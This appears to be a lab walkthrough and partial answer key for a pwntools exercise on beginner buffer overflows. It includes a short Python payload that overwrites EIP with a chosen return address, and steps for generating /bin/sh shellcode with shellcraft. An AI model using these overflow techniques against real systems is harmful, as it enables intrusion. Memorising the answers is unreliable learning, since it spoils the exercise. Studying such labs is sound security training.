# Intro To Pwntools

### Checksec
- Does Intro2pwn1 have FULL RELRO (Y or N)? `Y`
- Does Intro2pwn1 have RWX segments (Y or N)? `N`
- Does Intro2pwn2 have a stack canary (Y or N)? `N`
- Does Intro2pwn2 not have PIE (Y or N)? `Y`
- Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected? <br />
![image](https://github.com/user-attachments/assets/1a3ae39b-f459-4a96-bab9-1866c5dbb7ce)<br />
`Stack Smashing`
- Now cause a buffer overflow on intro2pwn2. What error do you get? `Segmentation Fault`

### Cyclic
- Which user owns both the flag.txt and intro2pwn3 file? `dizmas`
- Use checksec on intro2pwn3. What bird-themed protection is missing?<br />
![image](https://github.com/user-attachments/assets/e51887cd-d3de-4d3f-850c-3bcd458335e3)<br />
`canary`
- What ascii letter sequence is 0x4a4a4a4a (pwndbg should tell you).<br />
![image](https://github.com/user-attachments/assets/1f309b36-63e9-4b18-b022-966b54cce71b)<br />
`JJJJ`
- What is the output of "cyclic 12"? `aaaabaaacaaa`
- What pattern, in hex, was the eip overflowed with? `0x6161616a`
- What is the flag?<br />
Execute the following code:

      from pwn import *
      padding = cyclic(cyclic_find('jaaa'))
      eip = p32(0x8048536)
      payload = padding + eip
      print(payload)

### Networking
- What port is serving our challenge?
- Please use checksec on serve_test. Is there a stack canary? (Y or N)
- What is the flag?

### Shellcraft
- What does ASLR stand for? `address space layout randomization`
- Who owns intro2pwnFinal? `root`
- Use checksec on intro2pwn final. Is NX enabled? (Y or N) `N`
- Please use the cyclic tool and gdb to find the eip. What letter sequence fills the eip?
- Run your exploit with the breakpoint outside of gdb (./intro2pwnFinal < output_file). What does it say when you hit the breakpoint?
- Run the command "shellcraft i386.linux.sh -f a", which will print our shellcode in assembly format. The first line will tell you that it is running a function from the Unix standard library, with the parameters of "(path='/bin///sh', argv=['sh'], envp=0)." What function is it using?
- Run whoami once you have the shell. Who are you?
- What is the flag?
